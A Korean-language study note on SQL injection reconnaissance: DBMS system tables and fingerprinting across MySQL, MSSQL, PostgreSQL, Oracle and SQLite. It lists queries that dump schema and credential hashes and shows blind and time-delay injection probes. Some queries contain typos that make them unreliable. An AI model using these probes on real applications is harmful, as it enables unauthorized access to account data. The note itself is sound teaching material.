# System Table & DBMS Fingerprinting

SQL Injection 취약점이 발생할 때 데이터베이스의 테이블과 컬럼 등 데이터베이스가 저장하고 있는 중요 정보를 수집하는 방법
* 핑거프린팅(Fingerprinting)
    - 공격 대상의 정보를 수집하는 과정
        + 공격 대상이 사용하는 웹 서버와 개발 언어, 그리고 DBMS의 내부 정보 등을 알아내는 과정 등이 해당됨
    - Penetration Testing Execution Standard(PTES)에서 정의한 모의 해킹의 7단계 중 1단계에 해당
        + 1단계: 공격 대상을 정하고 대상의 정보를 수집함 (가장 중요한 단계 중 하나)

<br/><br/>

# System Tables
DBMS마다 존재하는, 데이터베이스의 정보를 포괄하는 테이블
* 설정 및 계정 정보 외에도 테이블과 컬럼 정보, 현재 실행되고 있는 쿼리의 정보 등 다양한 정보를 포함하고 있음
* **데이터베이스를 구성하기 위한 필수 요소이기 때문에 삭제할 수 없음**
    - SQL Injection 취약점을 발견하면 DBMS 별 시스템 테이블을 이용하여 공격 수행 가능
* SQL Injection 발생 시 시스템 테이블을 이용한다면 테이블과 컬럼명을 쉽게 획득할 수 있음
    - 시스템 테이블을 활용한 공격이 중요한 이유: SQL Injection으로 원하는 정보를 알아내기 위해서는 해당 정보가 포함된 테이블과 컬럼명을 알아야 함
        + 시스템 테이블에서 알아낸 정보로 공격자는 계정 정보 등의 민감한 정보를 쉽게 획득할 수 있음

<br/><br/>

## 각 DBMS의 시스템 테이블
### MySQL
* MySQL의 특징
    - 스키마와 데이터베이스가 같음
    - 초기 설치 시 ```information_schema```, ```mysql```, ```performance_schema```, 그리고 ```sys``` 데이터베이스가 존재함
    - 생성된 데이터베이스의 목록을 확인하는 명령
        ```sql
        -- 데이터베이스의 목록을 출력함 (초기 설치 시 존재하는 데이터베이스들과 이용자 정의 데이터베이스가 출력됨)
        SHOW databases;
        ```
#### ```information_schema```: (Read-only) MySQL 서버 내에 존재하는 DB의 메타 정보(테이블, 컬럼, 인덱스 등의 스미카 정보)를 모아둔 DB
* 실제 레코드가 있는 게 아니라 SQL을 이용해 조회할 때마다 메타 정보를 MySQL 서버의 메모리에서 가져와서 보여줌
* 메타 데이터(Metadata): 데이터의 데이터
    - 데이터베이스 또는 테이블의 이름, 컬럼의 데이터 타입, 접근 권한 같은 것을 의미함
* ```information_schema```의 주요 테이블
    | 테이블 | 설명 |
    |---|--------|
    | ```TABLES``` 테이블 | 생성된 모든 테이블의 정보를 담고 있음 (스키마, 테이블의 정보를 조회할 수 있음) |
    | ```COLUMNS``` 테이블 | 모든 스키마의 컬럼 정보를 확인할 수 있음 (컬럼의 정보를 조회할 수 있음) |
    | ```PROCESSLIST``` 테이블 | 수행 중인 프로세스 리스트를 담고 있음 (실시간으로 실행되는 쿼리를 조회할 수 있음) |
    | ```USER_PRIVILEGES``` 테이블 | 사용자 권한 정보를 담고 있음 (MySQL 서버의 계정 정보를 조회할 수 있음) |
    + ```information_schema``` DB의 각 테이블 조회 예시
        ```sql
        -- 스키마 정보 조히: information_schema 데이터베이스의 TABLES 테이블에서 TABLE_SCHEMA(테이블 스키마)에 해당하는 정보를 그룹화하여 조회
        SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

        -- 테이블 정보 조회: information_schema 데이터베이스의 TABLES 테이블에서 TABLE_SCHEMA(테이블의 스키마)와 TABLE_NAME(테이블 이름)을 조회
        SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;

        -- 컬럼 정보 조회: information_schema 데이터베이스의 COLUMNS 테이블에서 TABLE_SCHEMA(테이블 스키마), TABLE_NAME(테이블 이름), 그리고 COLUMN_NAME(컬럼 이름)을 조회 → 해당 정보를 조합해 계정 정보를 탈취할 수 있음
        SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS;

        -- 실시간 실행 쿼리 정보 조회: information_schema 데이터베이스의 PROCESSLIST 테이블의 모든 내용을 조회함 (쿼리 결과에 조회하기 위해 입력한 쿼리가 포함되어 있음을 알 수 있음)
        SELECT * FROM information_schema.PROCESSLIST;
        /* SYS 데이터베이스의 SESSION 테이블을 통해서 실행 중인 계정과 함께 조회하는 방법도 있음
        SELECT user, current_statement FROM sys.session;
        */

        -- DBMS 계정 정보 조회: information_schema 데이터베이스의 USER_PRIVILEGES 테이블에서 GRANTEE(계정 정보), PRIVILEGE_TYPE, IS_GRANTABLE(각 권한에 대한 내용들 - 허용된 쿼리문과 해당 권한을 부여할 수 있는지 여부 등)을 조회함
        SELECT GRANTEE, PRIVILEGES_TYPE, IS_GRANTABLE FROM information_schema.USER_PRIVILGES;
        /* mysql 데이터베이스의 user 테이블을 통해 DBMS의 계정 정보를 조회하는 방법도 있음
        SELECT user, authentication_string FROM mysql.user;
        */
        ```


<br/>

### MSSQL
* MSSQLL의 특징
    - 초기 설치 시 ```master```, ```tempdb```, ```model```, 그리고 ```msdb``` 데이터베이스가 존재함
    - 생성된 데이터베이스의 목록을 확인하는 명령
        ```sql
        -- 데이터베이스의 목록을 출력함 (초기 설치 시 존재하는 데이터베이스들과 이용자 정의 데이터베이스가 출력됨)
        SHOW databases;
        ```
* ```master``` 데이터베이스
    - master 데이터베이스의 ```sysdatabases``` 테이블
        + 데이터베이스의 정보를 조회할 수 있음
        + ```master..sysdatabases``` 조회 예시
            ```sql
            -- master 데이터베이스의 sysdatabases 테이블에서 name(데이터베이스 이름)에 해당하는 정보를 출력함
            SELECT name FROM master..sysdatabases; -- 초기 설치 시 존재하는 데이터베이스들과 이용자 정의 데이터베이스(들)의 이름이 출력됨

            -- DB_NAME(num) 형식으로 데이터베이스의 정보를 알아낼 수도 있음
            SELECT DB_NAME(1); -- 1번 데이터베이스가 master라면 master를 출력함 (0: 현재 데이터베이스를 의미)
            ```
    - master 데이터베이스의 ```sys.sql_logins``` 테이블
        + MSSQL 서버의 계정 정보를 조회할 수 있음
            - master 데이터베이스의 ```syslogins``` 테이블을 통해서도 조회 가능함
        + ```master.sys.sql_logins``` 조회 예시
            ```sql
            -- master 데이터베이스의 sys.sql_logins 테이블을 통해 user(계정 이름)과 password_hash(비밀번호의 해시 정보)를 조회함
            SELECT name, password_hash FROM master.sys.sql_logins;
            -- 유사한 결과를 출력하는 쿼리 (master 데이터베이스의 syslogins 테이블 이용)
            SELECT * FROM master..syslogins;
            ```
* 이용자 정의 데이터베이스의 ```sysobjects``` 테이블
    - 이용자 정의 데이터베이스의 테이블 정보를 조회할 수 있음
        + ```xtype='U'```: 이용자 정의 테이블을 의미함
        + 이용자 정의 데이터베이스의 ```information_schema``` 스키마의 ```tables``` 테이블을 통해서도 조회 가능
    - 이용자 정의 데이터베이스의 테이블 정보를 조회하는 예시(이용자 정의 데이터베이스: ```users```)
        ```sql
        -- sysobjects 테이블을 통해 users 데이터베이스의 테이블 정보를 조회함
        SELECT name FROM users..sysobjects WHERE xtype='U';
        -- 동일한 결과를 출력하는 쿼리 (information_schema의 tables 테이블 이용)
        SELECT table_name FROM users.information_schema.tables;
        ```
* ```syscolumns``` 테이블
    - 컬럼의 정보를 조회할 수 있음
        + 이용자 정의 데이터베이스의 ```information_schema``` 스키마의 ```columns``` 테이블을 참조하여 조회 가능
    - ```syscolumns``` 조회 예시
        ```sql
        -- syscolumns 테이블에서 서브쿼리의 결과에 해당하는 id의 name을 조회함
        SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects FROM name='user1');
        -- 유사한 결과를 출력하는 쿼리(information_schema의 columns 테이블 이용)
        SELECT table_name, colunn_name FROM users.information_schema.columns;
        ```

<br/>

### PostgreSQL
* ```pg_database```: 생성된 데이터베이스 목록을 확인할 수 있음
    - 데이터베이스의 이름, 소유자, 정렬 순서 등의 데이터베이스 정보를 관리함
    - ```pg_database``` 조회 예시
        ```sql
        -- pg_database의 datname(데이터베이스 이름)을 조회
        SELECT datname FROM pg_database;
        /* 출력 결과 (초기 설치 시 아래와 같은 세 개의 데이터베이스가 존재함)
        datname
        ----------
        postgres
        template1
        template0
        */
        ```

#### ```pg_catalog```: 주요 정보를 담고 있는 테이블을 포함한 스키마(시스템 카탈로그)
* ```information_schema```로도 비슷한 정보를 조회할 수 있음
* ```pg_catalog``` 조회 예시
    ```sql
    -- pg_catalog 스키마의 pg_namespace(스키마 정보) 테이블에서 nspname(네임스페이스의 이름)을 조회
    SELECT nspname FROM pg_catalog.pg_namespace;
    /* 출력 결과
    nspname
    ----------
    pg_toast
    pg_temp_1
    pg_toast_temp_1
    pg_catalog
    public
    information_schema
    */
    ```
* ```pg_catalog``` 스키마의 각 테이블을 이용해 조회할 수 있는 정보들
    | 테이블 | 조회할 수 있는 정보 |
    |----|------|
    | ```pg_catalog.pg_shadow``` 테이블 | PostgreSQL 서버의 계정 정보를 조회할 수 있음 |
    | ```pg_catalog.pg_settings``` 테이블 | PostgreSQL 서버의 설정 정보를 조회할 수 있음 |
    | ```pg_catalog.pg_stat_activity``` 테이블 | 실시간으로 실행되는 쿼리를 조회할 수 있음 |
    - ```pg_catalog``` 스키마의 각 테이블 조회 예시
        ```sql
        --- DBMS 계정 정보 조회: pg_catalog 스키마의 pg_shadow 테이블을 통해 username(계정 이름)과 passwd(비밀번호의 해시 정보)를 조회함
        SELECT username, passwd FROM pg_catalog.pg_shadow;

        -- DBMS 설정 정보 조회: pg_catalog 스키마의 pg_settings 테이블을 통해 name(서버 명)과 setting(설정 정보)를 조회함
        SELECT name, setting FROM pg_catalog.pg_settings;

        -- 실시간 실행 쿼리 확인: pg_catalog 스키마의 pg_stat_activity 테이블을 통해 username(쿼리를 실행시킨 계정 이름)과 query(실행된 쿼리)를 조회함
        SELECT username, query FROM pg_catalog.pg_stat_activity;
        ```

#### ```information_schema```: 데이터베이스의 모든 메타 정보를 가지고 있음
* 각 테이블의 정보를 조회하는데 사용할 수 있음
* ```information_schema``` 조회 예시
    ```sql
    -- information_schema 스키마의 tables 테이블에서 pg_catalog의 table_name(테이블 이름)을 조회
    SELECT table_name FROM information_schema.tables WHERE table_schema='pg_catalog';
    /* 출력 결과
    table_name
    ------------
    pg_shadow
    pg_settings
    pg_databases
    ...
    */

    -- information_schema 스키마의 tables 테이블에서 information_schema의 table_name(테이블 이름)을 조회
    SELECT table_name FROM information_schema.tables WHERE table_schema='information_schema';
    /* 출력 결과
    table_name
    -------------
    schemata
    tables
    columns
    ...
    */
    ```
    + 쿼리 결과에 각 스키마의 테이블 이름이 출력됨
* ```information_schema``` 스키마의 각 테이블을 이용해 조회할 수 있는 정보들
    | 테이블 | 조회할 수 있는 정보 |
    |----|------|
    | ```information_schema.tables``` 테이블 | 데이터베이스의 스키마 및 테이블 정보 등을 조회할 수 있음 |
    | ```information_schema.columns``` 테이블 | 컬럼 정보를 조회할 수 있음 |
    - ```information_schema``` 스키마의 각 테이블 조회 예시
        ```sql
        -- 테이블 정보 조회: information_schema 스키마의 tables 테이블을 통해 table_schema(테이블의 스키마)와 table_name(테이블 이름)을 조회
        SELECT table_schema, table_name FROM information_schema.tables;

        -- 컬럼 정보 조회: information_schema 스키마의 columns 테이블을 통해 table_schema(테이블의 스키마), table_name(테이블 이름), column_name(컬럼 이름)을 조회
        SELECT table_schema, table_name, column_name FROM information_schema.columns
        ```


<br/>

### Oracle
* ```all_tables```: 데이터베이스의 정보를 확인할 수 있는 테이블
    - 현재 사용자가 접근할 수 있는 테이블의 집합 (= 로그인된 계정의 권한으로 접근할 수 있는 모든 테이블들)
    - ```all_tables``` 테이블 조회 예시
        ```sql
        -- all_tables의 onwer(테이블을 소유한 사용자)를 조회
        SELECT DISTINCT owner FROM all_tables; -- DISTINCT(중복 제거) 키워드로 중복된 데이터를 제거함

        -- all_tables의 owenr(테이블을 소유한 사용자)와 table_name(테이블 이름)을 조회
        SELECT owner, table_name FROM all_tables;
        ```

* ```all_tab_columns```: 특정 테이블의 컬럼 정보를 확인할 수 있는 테이블
    - 현재 로그인된 계정의 권한으로 접근할 수 있는 모든 테이블 내의 컬럼의 집합
    - WHERE 구문으로 ```table_name```에 조회하고 싶은 테이블을 조건으로 입력하면 해당 테이블의 컬럼 이름을 조회할 수 있음
    - ```all_tab_columns``` 테이블 조회 예시
        ```sql
        -- all_tab_columns 테이블에서 table_name이 users인 테이블의 column_name(컬럼 이름)을 조회
        SELECT column_name FROM all_tab_columns WHERE table_name = 'users';
        ```

* ```all_users```: DBMS 계정 정보를 확인할 수 있는 테이블
    - 모든 유저의 정보를 조회할 수 있음
    - ```all_users``` 테이블 조회 예시
        ```sql
        -- alㅣ_users 테이블의 모든 열을 조회하여 DBMS에 생성된 모든 유저를 조회
        SELECT * FROM all_users; -- SELECT * FROM DBA_USERS;를 이용해도 동일한 결과가 출력됨
        ```

<br/>

### SQLite
* ```sqlite_master``` 시스템 테이블
    - 생성되어 있는 테이블 등의 정보와 sql를 획득할 수 있음
    - ```sqlite_master``` 테이블 조회 예시
        ```sql
        .header on -- 콜솔에서 실행 시 컬럼 헤더를 출력하기 위해 설정

        -- sqlite_master 테이블의 전체 데이터를 조회함
        SELECT * FROM sqlite_master;
        /* 출력된 결과
        type | name | tbl_name | rootpage | sql
        table | users | users | 2 | CREATE TABLE users (uid text, upw text)
        */
        ```
        + uid(text), upw(text)를 열으로 가지고 있는 users 테이블와 해당 테이블 생성 시 사용된 SQL를 획득

<br/><br/>

# DBMS Fingerprinting
### **DBMS의 종류와 버전**: SQL Injection 취약점을 발견했을 시 제일 먼저 알아내야 할 정보
* DBMS는 용도와 목적에 따라 MySQL, MSSQL, Oracle, SQLite 등을 선택해 사용할 수 있음
    - 모두 비슷한 형태를 띄지만 각 시스템 별로 제공하는 함수가 다름
    - DBMS의 종류와 버전을 알아내면 해당 DBMS에서 제공하는 기능을 통해 보다 수월한 공격을 수행할 수 있음 <br/> &nbsp;&nbsp; → 알아낸 DBMS와 운영체제의 정보는 또 다른 공격을 시도하는데 있어 중요하게 작용함
* SQL Injection 발생 상황 별로 DBMS 정보를 수집하는 방법
    - 쿼리 실행 결과 출력
        + 애플리케이션에서 삽입한 쿼리의 실행 결과를 출력한다면 **DBMS에서 지원하는 환경 변수의 값을 이용할 수 있음**
        + 예시: DBMS에서 제공하는 환경 변수와 함수를 사용해 버전을 확인하는 쿼리문
            ```sql
            SELECT @@version;
            SELECT version();
            ```
    - 에러 메시지 출력
        + 삽입할 쿼리를 애플리케이션에서 실행하면서 에러 메시지를 출력하는 경우 **사용하는 DBMS를 알아낼 수 있음**
        + 예시: 잘못된 쿼리를 삽입하여 에러 메시지를 출력시키는 경우
            ```sql
            -- 컬럼의 수가 일치하지 않으면 UNION 구문은 에러를 발생시킴
            SELECT 1 UNION SELECT 1, 2;
            /* 출력 결과(MySQL의 경우)
            ERROR 1222 (21000): The used SELECT statements haver a different number of columns
            → 해당 에러코드는 MySQL에서만 사용되므로 이를 통해 DBMS의 정보가 노출됨
            */           
            ```
    - 참 또는 거짓 출력
        + 애플리케이션에서 쿼리 실행 결과가 아닌 참과 거짓 여부만을 출력할 경우 **Blind SQL Injection 공격으로 사용 중인 DBMS를 알아낼 수 있음**
        + 예시: Blind SQL Injection 기법을 이용한 쿼리문의 일부
            ```sql
            -- 버전 환경 변수 및 함수를 통해 가져온 버전을 한 바이트씩 비교해 알아냄
            MID(@@version, 1, 1) = '5';
            SUBSTR(version(), 1, 1) = 'P';
            ```
    - 예외 상황
        + 애플리케이션에서 쿼리와 관련된 어떠한 결과도 출력하지 않는 경우 **시간 지연 함수를 사용함**
            - 일부 DBMS에서는 시간 지연 함수가 존재하지 않음 → 시스템에 맞는 시간 지연 함수를 사용해야 함
        + 예시: 시간 지연 함수
            ```sql
            SLEEP(10) -- (MySQL) 10sec 동안 대기
            pg_sleep(10) -- (PostgreSQL)
            ```

<br/><br/>

## DBMS의 종류에 따른 데이터베이스 정보 수집 방법
### MySQL
* 쿼리 실행 결과 출력
    - ```version``` 환경 변수 또는 ```version``` 함수를 사용해 MySQL DBMS의 버전과 운영 체제 정보를 알아낼 수 있음
        ```sql
        -- 사용하고 있는 MySQL의 버전과 운영 체제 정보를 출력함
        SELECT @@version; -- 1> version 환경 변수 사용
        SELECT version(); -- 2> version() 함수 사용
        ```
* 에러 메시지 출력
    - ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 에러 메시지에 포함된 에러 코드로 DBMS가 MySQL임을 알 수 있음
        ```sql
        -- UNION 문의 컬럼의 개수가 일치하지 않으면 에러를 발생시킨다는 점을 이용하여 에러를 발생시킴
        SELECT 1 UNION SELECT 1, 2;
        -- ERROR 1222 (21000): The used SELECT statements have a different number of columns
        ```
* 참 또는 거짓 출력
    - ```version``` 환경 변수의 값(버전)의 각 위치에 해당하는 문자를 ```MID``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
        ```sql
        -- @@version의 내용: '5.7.29-0ubuntu0.16.04.'
        -- MID(@@version, 1, 1) → version 환경 변수의 첫 번째 문자: '5'

        -- @@version의 첫 번째 문자가 '5'인지 확인 → 결과: 1 (true)
        SELECT MID(@@version, 1, 1) = '5';
        -- @@version의 첫 번째 문자가 '6'인지 확인 → 결과: 0 (false)
        SELECT MID(@@VERSION, 1, 1) = '6';
        ```
* 예외 상황
    - 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```SLEEP``` 함수를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
        ```sql
        -- SUBSTRING(@@version, 1, 1) → version 환경 변수의 첫 번째 문자: 'M'

        -- SELECT 문에서 AND 앞의 식이 참(1)이므로 SLEEP(2)가 실행되어 2초 지연됨
        SELECT MID(@@version, 1, 1) = '5' AND SLEEP(2); -- 결과: 1 row in set (2.00 sec)
        -- SELECT 문에서 AND 앞의 식이 거짓(0)이므로 SLEEP(2)는 실행되지 않음
        SELECT MID(@@version, 1, 1) = '6' AND SLEEP(2); -- 결과: 1 row in set (0.00 sec)
        ```

<br/>

### MSSQL
* 쿼리 실행 결과 출력
    - ```version``` 환경 변수를 이용해 DBMS의 버전과 운영 체제 정보를 알아낼 수 있음
        ```sql
        -- @@version(환경 변수)를 조회하면 사용하고 있는 DBMS의 종류와 버전, 현재 DBMS가 운영되고 있는 운영체제의 정보(종류와 버전)을 반환함
        SELECT @@version;
        ```
* 에러 메시지 출력
    - ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 에러 메시지에 포함된 키워드로 MSSQL에서 출력된 문자열임을 검색을 통해 확인할 수 있음
        ```sql
        -- UNION 문은 컬럼의 개수가 같지 않다면 에러를 발생시킴
        SELECT 1 UNION SELECT 1, 2;
        -- All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
        ```
* 참 또는 거짓 출력
    - ```version``` 환경변수로 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTRING``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
        ```sql
        -- @@version의 내용: 'Microsoft SQL Server ...'
        -- SUBSTRING(@@version, 1, 1) → version 환경 변수의 첫 번째 문자: 'M'

        -- @@version의 첫 번째 문자가 'M'인지 확인 → 결과: 1 출력(1 rows affected) → 참
        SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'M';
        -- @@version의 첫 번째 문자가 'N'인지 확인 → 결과: 아무것도 출력하지 않음(0 rows affected) → 거짓
        ```
* 예외 상황
    - 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```WAITFOR DELAY```를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
        ```sql
        -- SUBSTRING(@@version, 1, 1) → version 환경 변수의 첫 번째 문자: 'M'
        -- WHERE 절에서 AND 앞의 식이 참이므로 WAITFROY DELAY '0:0:5'가 실행되어 5초 지연됨
        SELECT 1 WHERE SUBSTRING(@@version, 1, 1) = 'M' AND WAITFOR DELAY '0:0:5';
        ```

<br/>

### PostgreSQL
* 쿼리 실행 상황 출력
    - ```version``` 함수를 사용해 DBMS의 상세 정보와 운영체제 정보를 알아낼 수 있음
        ```sql
        -- version() 함수: PostgreSQL 버전과 운영 체제 정보를 반환함
        SELECT version();
        ```
* 에러 메시지 출력
    - ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 에러 메시지에 포함된 키워드로 PostgreSQL에서 출력된 문자열임을 검색을 통해 확인할 수 있음
        ```sql
        -- UNION 문은 컬럼의 개수가 같지 않다면 에러를 발생시킴
        SELECT 1 UNION SELECT 1, 2;
        -- ERROR: each UNION query must have the same number of columns
        ```
* 참 또는 거짓 출력
    - ```version``` 함수로 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTR``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
        ```sql
        -- version()의 결과: 'PostgreSQL ...'
        -- SUBSTR(version(), 1, 1) → version()의 첫 번째 문자: 'P'
        
        -- version()의 첫 번째 문자가 'P'인지 확인 → 결과: t(참)
        SELECT SUBSTR(version(), 1, 1) = 'P';
        -- version()의 첫 번째 문자가 'Q'인지 확인 →결과: f(거짓)
        SELECT SUBSTR(version(), 1, 1)= 'Q';
        ```
* 예외 상황
    - 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```pg_sleep``` 함수를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
        ```sql
        -- SUBSTR(version(), 1, 1) → version()의 첫 번째 문자: 'P'
        -- SUBSTR 함수의 결과가 t라면 AND 연산자 뒤에 위치하는 식을 실행시킴
        SELECT SUBSTR(version(), 1, 1) = 'P' AND pg_sleep(10); # 10초 지연
        ```

<br/>

### SQLite
* 쿼리 실행 결과 출력
    - ```splite_version``` 함수를 이용해 DBMS의 버전을 알아낼 수 있음
        ```sql
        -- sqlite_version() 함수: 실행 중인 SQLite 버전 정보를 반환함
        SELECT sqlite_version();
        ```
* 에러 메시지 출력
    - ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 포함된 키워드로 SQLite에서 출력된 문자열임을 검색을 통해 확인할 수 있음
        ```sql
        -- UNION 문은 컬럼의 개수가 같지 않다면 에러를 발생시킴
        SELECT 1 UNION SELECT 1, 2;
        -- Error: SELECTs to the left and right of UNION do not have the same number of result columns
        ```
* 참 또는 거짓 출력
    - ```sqlite_version``` 함수로 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTR``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
        ```sql
        -- sqlite_version()의 결과: '3.11.0'
        -- SUBSTR(sqlite_version(), 1, 1) → sqlite_version()의 첫 번째 문자: '3'

        -- sqlite_version()의 첫 번째 문자가 3인지 확인 → 결과: 1 (참)
        SELECT SUBSTR(sqlite_version(), 1, 1) = '3';
        -- sqlite_version()의 첫 번째 문자가 4인지 확인 → 결과: 0 (거짓)
        SELECT SUBSTR(sqlite_version(), 1, 1) = '4';
        ```
* 예외 상황
    - 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
        ```sql
        -- SUBSTR(sqlite_version(), 1, 1) → sqlite_version()의 첫 번째 문자: '3'
        -- 조건식(WHEN 다음의 비교식)이 참이라면 LIKE(...)를, 아니라면 1=1을 실행함
        SELECT CASE WHEN substr(sqlite_version(), 1, 1) = '3' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1=1 END;
        ```
